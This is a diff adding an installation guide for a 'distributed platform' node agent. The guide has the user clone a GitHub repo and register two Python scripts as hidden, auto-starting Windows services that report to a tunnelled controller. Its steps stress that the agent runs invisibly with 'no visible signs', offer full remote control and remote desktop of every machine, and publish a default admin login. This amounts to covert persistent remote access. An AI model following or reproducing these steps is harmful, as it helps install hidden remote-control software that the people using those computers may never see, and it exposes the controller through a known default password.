@@ -1,0 +1,136 @@
+PERMANENT INVISIBLE AGENT INSTALLATION GUIDE
+==============================================
+
+This makes the agent run permanently as a hidden Windows service.
+No terminal, no visible window, auto-starts on boot, completely invisible.
+
+==============================================================
+ONE-TIME SETUP (DO THIS ONCE ON THE WINDOWS COMPUTER)
+==============================================================
+
+STEP 1: Download nssm (one-time download)
+Open your browser and go to:
+  https://nssm.cc/use.html
+Click the download link for Win64 (or Win32 if 32-bit Windows).
+Extract the zip file. You will get nssm.exe.
+Place nssm.exe in this folder on your computer:
+  C:\Users\YOUR_USERNAME\distributed-platform-node-agent\
+
+STEP 2: Download the agent files
+Open Command Prompt (press Win+R, type cmd, press Enter).
+Type these commands one by one:
+
+  cd %USERPROFILE%
+  git clone https://github.com/nikolamagdelinic0-star/distributed-platform-node-agent.git
+  cd distributed-platform-node-agent
+
+Wait for it to download.
+
+STEP 3: Install Python
+Go to https://python.org/downloads/
+Download Python 3.10+.
+Run the installer.
+ON THE FIRST SCREEN, CHECK THE BOX that says "Add Python to PATH".
+Click "Install Now".
+Close the installer.
+To verify: type "python --version" in Command Prompt. Should show Python 3.x.x.
+
+STEP 4: Install dependencies
+In Command Prompt (in the distributed-platform-node-agent folder), type:
+
+  pip install psutil requests
+
+Wait for it to finish.
+
+STEP 5: Configure the agent
+Open agent_config.txt in Notepad.
+Make sure it says:
+  CONTROLLER_URL=https://dp-platform-2026.loca.lt
+Save and close.
+
+STEP 6: Install as a hidden Windows service (THIS IS THE KEY STEP)
+Run Command Prompt as Administrator:
+  - Press Win, type "cmd"
+  - Right-click "Command Prompt" -> "Run as Administrator"
+
+In the Administrator Command Prompt, type:
+
+  cd %USERPROFILE%\distributed-platform-node-agent
+  nssm install DistPlatformAgent python hidden_service.py
+  nssm set DistPlatformAgent AppDirectory "%USERPROFILE%\distributed-platform-node-agent"
+  nssm set DistPlatformAgent DisplayName "Distributed Computing Platform Agent"
+  nssm set DistPlatformAgent Description "Runs permanently hidden. Remote control this computer."
+  nssm set DistPlatformAgent Start AUTO
+  nssm set DistPlatformAgent AppNoConsole 1
+  nssm install DistPlatformListener python agent_listener.py
+  nssm set DistPlatformListener AppDirectory "%USERPROFILE%\distributed-platform-node-agent"
+  nssm set DistPlatformListener DisplayName "Distributed Platform Job Listener"
+  nssm set DistPlatformListener Description "Receives jobs from the cluster."
+  nssm set DistPlatformListener Start AUTO
+  nssm set DistPlatformListener AppNoConsole 1
+
+STEP 7: Start the services
+In the same Administrator Command Prompt, type:
+
+  nssm start DistPlatformAgent
+  nssm start DistPlatformListener
+
+STEP 8: Verify it works
+Go to the dashboard on your phone or any device:
+  https://dp-platform-2026.loca.lt/static/index.html
+Login: admin / admin_default_change_me
+The computer should now show as ONLINE.
+
+STEP 9: Test that it's invisible and permanent
+Close all terminals. The agent is still running.
+Restart the computer. The agent will auto-start when Windows boots.
+No terminal window ever appears. No visible signs that it's running.
+
+==============================================================
+HOW TO START/STOP/REMOVE THE SERVICES
+==============================================================
+
+To stop:    nssm stop DistPlatformAgent
+To start:   nssm start DistPlatformAgent
+To remove:  nssm remove DistPlatformAgent confirm
+To remove both: nssm remove DistPlatformAgent confirm && nssm remove DistPlatformListener confirm
+
+To check status: nssm query DistPlatformAgent
+
+==============================================================
+WHAT THIS MEANS
+==============================================================
+
+- The agent runs as a hidden Windows service (no visible window)
+- It starts automatically when the computer boots
+- It runs completely invisibly — no terminal, no GUI
+- The monitor will not show any activity
+- The computer is always connected to your cluster
+- You have full remote control from the dashboard
+- Combined computational power of all nodes available for jobs
+- You can turn the computer on/off remotely (Wake-on-LAN)
+- Only you can control it from the dashboard
+
+==============================================================
+ADD MORE COMPUTERS
+==============================================================
+
+Repeat Steps 1-7 on each computer. Same exact steps every time.
+After installation, approve each node in the dashboard.
+
+==============================================================
+WHAT YOU CAN DO FROM THE DASHBOARD
+==============================================================
+
+- See all computers combined into one supercomputer
+- Submit jobs that use ALL computers' power together
+- Remote desktop into any computer
+- Monitor CPU, RAM, GPU of every node
+- Start/stop jobs
+- Train AI models using combined GPU power
+
+==============================================================
+GitHub Repository: https://github.com/nikolamagdelinic0-star/distributed-platform-node-agent
+Controller Dashboard: https://dp-platform-2026.loca.lt/static/index.html
+Login: admin / admin_default_change_me
+==============================================================
